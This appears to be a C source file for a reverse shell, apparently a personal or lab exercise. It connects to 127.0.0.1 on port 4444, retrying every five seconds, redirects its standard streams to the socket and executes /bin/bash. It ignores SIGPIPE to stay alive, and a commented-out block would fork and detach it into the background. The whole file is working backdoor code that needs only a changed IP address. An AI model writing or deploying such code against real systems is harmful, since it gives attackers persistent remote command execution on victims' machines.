#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <errno.h>

void run_shell(char *ip, int port){
    while(1){
        int socket_fd = socket(AF_INET,SOCK_STREAM,0);
        if(socket_fd < 0){
            sleep(5);
            continue;
        }

        struct sockaddr_in rev_addr;
        rev_addr.sin_family = AF_INET;
        rev_addr.sin_port = htons(port);
        rev_addr.sin_addr.s_addr = inet_addr(ip);

        //try to connect every 5 sec until success
        if(connect(socket_fd, (struct sockaddr *)&rev_addr, sizeof(rev_addr)) < 0){
            close(socket_fd);
            sleep(5);
            continue;
        }

        dup2(socket_fd, 0);
        dup2(socket_fd, 1);
        dup2(socket_fd, 2);

        execve("/bin/bash", NULL, NULL);

        //if execve fails close socket and exit loop child process
        close(socket_fd);
        continue;
    }
}

int main(int argc, char const* argv[]){
    signal(SIGPIPE, SIG_IGN); // ignore SIGPIPE so i doenst die when i kill netcat
    
    char *target_ip = "127.0.0.1";
    int target_port = 4444;
    
    /*//fork the process to run in the background
    pid_t pid = fork();
    if(pid < 0){
        exit(1); //fork failed
    }
    if(pid > 0){
        exit(0); // paret procss exits, the child run indipendently
    }

    //create new session so child is completely detached

    setsid();

    //run the connection loop
*/
    run_shell(target_ip,target_port);

    printf("wotking till here...\n");
    return 0;
}